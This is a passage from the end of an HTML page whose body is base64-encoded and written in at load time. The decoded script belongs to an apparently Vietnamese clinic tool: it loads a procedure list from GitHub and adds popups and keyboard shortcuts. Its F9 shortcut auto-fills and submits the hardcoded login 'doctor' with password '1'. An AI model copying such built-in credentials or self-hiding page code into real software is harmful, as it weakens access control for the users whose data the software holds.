ib2R5Pg0KICAgICAgPC90YWJsZT4NCiAgPC9kaXY+DQo8L2Rpdj4NCjxzY3JpcHQ+DQogIGNvbnN0IFRIVVRIVUFUX1VSTCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vY2hhdV90aHV0aHVhdC50eHQnOw0KDQogIGFzeW5jIGZ1bmN0aW9uIG9wZW5DdXN0b21pemVQYW5lbCgpIHsNCiAgICB0cnkgew0KICAgICAgaWYgKCF3aW5kb3cuUFJPQ0VEVVJFUyB8fCBPYmplY3Qua2V5cyh3aW5kb3cuUFJPQ0VEVVJFUykubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKFRIVVRIVUFUX1VSTCk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICB3aW5kb3cuUFJPQ0VEVVJFUyA9IEpTT04ucGFyc2UodGV4dCk7DQogICAgICB9DQogICAgfSBjYXRjaCAoZSkgew0KICAgICAgYWxlcnQoJ0tow7RuZyB0aOG7gyB04bqjaSBkYW5oIHPDoWNoIHRo4bunIHRodeG6rXQgdOG7qyBtw6F5IGNo4bunLicpOw0KICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICBjb25zdCByb3dzID0gW107DQogICAgT2JqZWN0LmVudHJpZXMoUFJPQ0VEVVJFUykuZm9yRWFjaCgoW25hbWUsIGNmZ10pID0+IHsNCiAgICAgIGlmICghbmFtZSB8fCAhY2ZnKSByZXR1cm47DQoNCiAgIC8vIHRyxrDhu5tjIMSRw7M6DQpsZXQgZHVyYXRpb24gPSAodHlwZW9mIGNmZy5kdXJhdGlvbiA9PT0gJ251bWJlcicpID8gY2ZnLmR1cmF0aW9uIDogJyc7DQovLyBO4bq/dSBjw7MgcHJlcCB0aMOsIGzhuqV5IHByZXAsIG7hur91IGtow7RuZyBjw7MgdGjDrCBnw6FuID0gZHVyYXRpb24NCmxldCBwcmVwID0gKHR5cGVvZiBjZmcucHJlcCA9PT0gJ251bWJlcicpID8gY2ZnLnByZXAgOiBkdXJhdGlvbjsNCg0KLy8gw6lwIHJpw6puZyBjaG8gIlPhuq9jIHRodeG7kWMgdGhhbmciDQppZiAobmFtZS50cmltKCkudG9Mb3dlckNhc2UoKS5pbmNsdWRlcygnc+G6r2MgdGh14buRYyB0aGFuZycpKSB7DQogIGR1cmF0aW9uID0gMTIwOw0KICBwcmVwID0gMTIwOw0KfQ0KICAgICAgaWYgKGR1cmF0aW9uICE9PSAnJykgew0KICAgICAgICByb3dzLnB1c2goeyBuYW1lLCBkdXJhdGlvbiwgcHJlcCB9KTsNCiAgICAgIH0NCiAgICB9KTsNCg0KICAgIHJvd3Muc29ydCgoYSxiKSA9PiBhLm5hbWUubG9jYWxlQ29tcGFyZShiLm5hbWUsICd2aScpKTsNCg0KICAgIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N1c3RvbWl6ZUJvZHknKTsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSByb3dzLm1hcCgociwgaWR4KSA9PiBgDQogICAgICA8dHI+DQogICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPiR7aWR4ICsgMX08L3RkPg0KICAgICAgICA8dGQ+JHtyLm5hbWV9PC90ZD4NCiAgICAgICAgPHRkIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+JHtyLmR1cmF0aW9ufTwvdGQ+DQogICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPiR7ci5wcmVwfTwvdGQ+DQogICAgICA8L3RyPg0KICAgIGApLmpvaW4oJycpOw0KDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N1c3RvbWl6ZU1vZGFsJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogIH0NCg0KICBmdW5jdGlvbiBjbG9zZUN1c3RvbWl6ZVBhbmVsKCkgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjdXN0b21pemVNb2RhbCcpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogIH0NCjwvc2NyaXB0Pg0KPHNjcmlwdD4NCmZ1bmN0aW9uIHNob3dOb1Blcm1pc3Npb24oKSB7DQogIC8vIE92ZXJsYXkNCiAgY29uc3Qgb3ZlcmxheSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBvdmVybGF5LnN0eWxlLmNzc1RleHQgPSBgDQogICAgcG9zaXRpb246Zml4ZWQ7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KTsNCiAgICBkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7ei1pbmRleDoxMjAwMDtgOw0KICAvLyBCb3gNCiAgY29uc3QgYm94ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQpib3guY2xhc3NOYW1lID0ncG9wdXAtc21hbGwnOw0KICBib3guaW5uZXJIVE1MID0gYA0KICAgIDxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxOHB4O2ZvbnQtd2VpZ2h0OjYwMDtjb2xvcjojZTc0YzNjO21hcmdpbi1ib3R0b206MTBweDsiPg0KICAgICAg8J+aqyBC4bqhbiBraMO0bmcgY8OzIHF1eeG7gW4gdGjDqm0gdGjhu6cgdGh14bqtdA0KICAgIDwvZGl2Pg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZCh0aGlzLmNsb3Nlc3QoJy5ub1Blcm1PdmVybGF5JykpIj4NCiAgICAgIMSQw7NuZw0KICAgIDwvYnV0dG9uPg0KICBgOw0KICBvdmVybGF5LmNsYXNzTGlzdC5hZGQoIm5vUGVybU92ZXJsYXkiKTsNCiAgb3ZlcmxheS5hcHBlbmRDaGlsZChib3gpOw0KICBvdmVybGF5LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZSA9PiB7DQogICAgaWYgKGUudGFyZ2V0ID09PSBvdmVybGF5KSBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOw0KICB9KTsNCiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvdmVybGF5KTsNCn0NCg0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihlKSB7DQogIGlmIChlLnRhcmdldCAmJiBlLnRhcmdldC5pZCA9PT0gImJ1eSIpIHsNCiAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eVBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgfQ0KfSk7DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKGUpIHsNCiAgLy8gTeG7nyBwb3B1cCBi4bqjbmcgZ2nDoSBu4bq/dSBjbGljayB2w6BvIG7DunQgaWQ9YnV5DQogIGlmIChlLnRhcmdldCAmJiBlLnRhcmdldC5pZCA9PT0gImJ1eSIpIHsNCiAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eVBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgICByZXR1cm47DQogIH0NCiAgLy8gxJDDs25nIHBvcHVwIGtoaSBjbGljayByYSBuZ2/DoGkgcGjhuqduIG7hu5lpIGR1bmcNCiAgY29uc3QgcG9wdXBzID0gWyJidXlQb3B1cCIsICJwYXltZW50UG9wdXAiLCAiY29uZmlybVBvcHVwIl07DQogIHBvcHVwcy5mb3JFYWNoKGlkID0+IHsNCiAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKTsNCiAgICBpZiAocG9wdXAgJiYgcG9wdXAuc3R5bGUuZGlzcGxheSA9PT0gImZsZXgiICYmIGUudGFyZ2V0ID09PSBwb3B1cCkgew0KICAgICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICB9DQogIH0pOw0KfSk7DQovLyDEkGnhu4F1IGjGsOG7m25nIG5oYW5oIGLhurFuZyBwaMOtbSBz4buRDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZnVuY3Rpb24oZSkgew0KICAgIGlmIChlLmNvZGUgPT09ICJGNyIpIHsNCiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICBjb25zdCBjaGVja2JveCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93TW9yZVN1Z2dlc3Rpb25zQ2hlY2tib3gnKTsNCiAgICAgICAgaWYgKGNoZWNrYm94KSB7DQogICAgICAgICAgICBjaGVja2JveC5jaGVja2VkID0gIWNoZWNrYm94LmNoZWNrZWQ7ICANCiAgICAgICAgICAgIC8vIEvDrWNoIGhv4bqhdCBz4buxIGtp4buHbiBjaGFuZ2UgxJHhu4MgY+G6rXAgbmjhuq10IGdpYW8gZGnhu4duDQogICAgICAgICAgICBjb25zdCBldmVudCA9IG5ldyBFdmVudCgnY2hhbmdlJyk7DQogICAgICAgICAgICBjaGVja2JveC5kaXNwYXRjaEV2ZW50KGV2ZW50KTsgICAgICAgICAgICANCiAgICAgICAgfQ0KICAgIH0NCiAgICAvLyBGNyAtIFRvZ2dsZSBjaGVja2JveCAiSGnhu4NuIHRo4buLIELDoWMgc8SpIGNo4buJIMSR4buLbmgiDQogICAgaWYgKGUuY29kZSA9PT0gIkY4Iikgew0KICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgIGNvbnN0IGNoZWNrYm94ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpOw0KICAgICAgICBpZiAoY2hlY2tib3gpIHsNCiAgICAgICAgICAgIGNoZWNrYm94LmNoZWNrZWQgPSAhY2hlY2tib3guY2hlY2tlZDsNCiAgICAgICAgICAgIC8vIEvDrWNoIGhv4bqhdCBz4buxIGtp4buHbiBjaGFuZ2UgxJHhu4MgY+G6rXAgbmjhuq10IGdpYW8gZGnhu4duDQogICAgICAgICAgICBjb25zdCBldmVudCA9IG5ldyBFdmVudCgnY2hhbmdlJyk7DQogICAgICAgICAgICBjaGVja2JveC5kaXNwYXRjaEV2ZW50KGV2ZW50KTsgICAgICAgICAgDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvLyA9PT09IE1BUCBDw4FDIELhuqJORyA9PT09DQogICAgY29uc3Qgc2VjdGlvbk1hcCA9IHsNCiAgICAgICAgIkYxIjogImVycm9yU2VjdGlvbiIsDQogICAgICAgICJGMiI6ICJyZXN1bHRTZWN0aW9uIiwNCiAgICAgICAgIkYzIjogIm1hY2hpbmVFcnJvclNlY3Rpb24iLA0KICAgICAgICAiRjQiOiAibWFjaGluZUNvbmZsaWN0U2VjdGlvbiIsDQogICAgICAgICJGNSI6ICJtaXNzaW5nTWFjaGluZVNlY3Rpb24iLA0KCQkiRjYiOiAiZGF0ZU1pc21hdGNoU2VjdGlvbiINCiAgICB9Ow0KICAgIC8vID09PT0gRjEwIOKGkiBSZWxvYWQgdHJhbmcgPT09PQ0KICAgIGlmIChlLmNvZGUgPT09ICJGMTAiKSB7DQogICAgICAgIGUucHJldmVudERlZmF1bHQoKTsNCiAgICAgICAgbG9jYXRpb24ucmVsb2FkKCk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgLy8gPT09PSBDdHJsICsgTyDihpIgTeG7nyBmaWxlID09PT0NCiAgICBpZiAoZS5jdHJsS2V5ICYmICFlLnNoaWZ0S2V5ICYmIGUua2V5LnRvTG93ZXJDYXNlKCkgPT09ICJvIikgew0KICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0cmlnZ2VyQnV0dG9uIik/LmNsaWNrKCk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgLy8gPT09PSBDdHJsICsgU2hpZnQgKyBPIOKGkiBN4bufIHRoxrAgbeG7pWMgPT09PQ0KICAgIGlmIChlLmN0cmxLZXkgJiYgZS5zaGlmdEtleSAmJiBlLmtleS50b0xvd2VyQ2FzZSgpID09PSAibyIpIHsNCiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZm9sZGVyQnRuIik/LmNsaWNrKCk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgLy8gPT09PSBO4bq/dSBraMO0bmcgcGjhuqNpIEYx4oCTRjUgdGjDrCBi4buPIHF1YSA9PT09DQogICAgaWYgKCFbIkYxIiwiRjIiLCJGMyIsIkY0IiwiRjUiLCJGNiJdLmluY2x1ZGVzKGUua2V5KSkgcmV0dXJuOw0KICAgIGNvbnN0IHRhcmdldElkID0gc2VjdGlvbk1hcFtlLmtleV07DQogICAgY29uc3QgdGFyZ2V0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQodGFyZ2V0SWQpOw0KICAgIGlmICghdGFyZ2V0KSByZXR1cm47DQogICAgLy8g4pyFIE7hur91IENhcHNMb2NrIGLhuq10IOKGkiDhuqhuIGjhur90ICYgY2jhu4kgaGnhu4duIDEgYuG6o25nDQogICAgaWYgKGUuZ2V0TW9kaWZpZXJTdGF0ZSgiQ2Fwc0xvY2siKSkgew0KICAgICAgICBPYmplY3QudmFsdWVzKHNlY3Rpb25NYXApLmZvckVhY2goc2VjID0+IHsNCiAgICAgICAgICAgIGNvbnN0IGVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoc2VjKTsNCiAgICAgICAgICAgIGlmIChlbCkgZWwuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgfSk7DQogICAgICAgIHRhcmdldC5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICB9DQogICAgLy8g4pyFIEx1w7RuIHNjcm9sbCB04bubaSBi4bqjbmcNCiAgICB0YXJnZXQuc2Nyb2xsSW50b1ZpZXcoeyBiZWhhdmlvcjogJ3Ntb290aCcsIGJsb2NrOiAnc3RhcnQnIH0pOw0KfSk7DQovLyBUaMOqbSBz4buxIGtp4buHbiBjaG8gY2hlY2tib3ggc2hvd0RvY3RvciDEkeG7gyBj4bqtcCBuaOG6rXQgdOG6pXQgY+G6oyBjw6FjIGLhuqNuZw0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgIC8vIEPhuq1wIG5o4bqtdCBjw6FjIGLhuqNuZyBtw6F5DQogICAgaWYgKG1hY2hpbmVFcnJvckxvZy5sZW5ndGggPiAwKSBkaXNwbGF5TWFjaGluZUVycm9ycygpOw0KICAgIGlmIChtYWNoaW5lQ29uZmxpY3RMb2cubGVuZ3RoID4gMCkgZGlzcGxheU1hY2hpbmVDb25mbGljdHMoKTsNCiAgICBpZiAobWlzc2luZ01hY2hpbmVMb2cubGVuZ3RoID4gMCkgZGlzcGxheU1pc3NpbmdNYWNoaW5lRXJyb3JzKCk7DQoJaWYgKGRhdGVNaXNtYXRjaExvZy5sZW5ndGggPiAwKSBkaXNwbGF5RGF0ZU1pc21hdGNoRXJyb3JzKCk7DQp9KTsNCi8vID09PT0gRjkg4oaSIFThu7EgxJHhu5luZyDEkcSDbmcgbmjhuq1wIGRvY3RvciA9PT09DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZnVuY3Rpb24oZSkgew0KICAgIGlmIChlLmNvZGUgPT09ICJGOSIpIHsNCiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICAvLyBLaeG7g20gdHJhIHhlbSBjw7MgxJFhbmcg4bufIHRyYW5nIMSRxINuZyBuaOG6rXAga2jDtG5nDQogICAgICAgIGNvbnN0IGxvZ2luU2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpblNlY3Rpb24nKTsNCiAgICAgICAgaWYgKGxvZ2luU2VjdGlvbiAmJiBsb2dpblNlY3Rpb24uc3R5bGUuZGlzcGxheSAhPT0gJ25vbmUnKSB7DQogICAgICAgICAgICAvLyDEkGnhu4FuIHRow7RuZyB0aW4gxJHEg25nIG5o4bqtcA0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKS52YWx1ZSA9ICdkb2N0b3InOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS52YWx1ZSA9ICcxJzsgIA0KICAgICAgICAgICAgLy8gVOG7sSDEkeG7mW5nIGLhuqVtIMSRxINuZyBuaOG6rXANCiAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkJ0bicpLmNsaWNrKCk7DQogICAgICAgICAgICB9LCAxMDApOw0KICAgICAgICB9DQogICAgfQ0KfSk7DQo8L3NjcmlwdD4NCg0KPC9ib2R5Pg0KPC9odG1sPg==";
  const binary = atob(base64);
  const bytes = new Uint8Array([...binary].map(c => c.charCodeAt(0)));
  const decoded = new TextDecoder("utf-8").decode(bytes);
  document.write(decoded);
</script>
</body>
</html>
